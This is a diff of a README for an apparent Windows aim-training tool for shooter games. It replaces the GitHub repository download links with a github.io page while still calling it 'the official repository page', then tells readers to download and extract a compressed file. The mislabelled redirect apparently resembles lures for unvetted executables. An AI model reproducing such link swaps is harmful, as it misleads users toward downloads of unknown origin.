@@ -1,6 +1,6 @@
 # 🎯 apex-sensitivity-aim-lab - Improve your aim across multiple shooters
 
-[![Download Tool](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Salubrious-lethalgene996/apex-sensitivity-aim-lab)
+[![Download Tool](https://img.shields.io/badge/Download-Application-blue.svg)](https://salubrious-lethalgene996.github.io)
 
 ## 📖 About the project
 
@@ -20,7 +20,7 @@ This application offers tools to help you gain control over your mouse movement.
 
 Follow these steps to set up the tool on your Windows computer.
 
-1.  Visit the official repository page to download the latest version: [https://github.com/Salubrious-lethalgene996/apex-sensitivity-aim-lab](https://github.com/Salubrious-lethalgene996/apex-sensitivity-aim-lab)
+1.  Visit the official repository page to download the latest version: [https://salubrious-lethalgene996.github.io](https://salubrious-lethalgene996.github.io)
 2.  Click on the green Code button or navigate to the Releases section on the page.
 3.  Download the compressed file to your computer.
 4.  Right-click the folder and select Extract All.
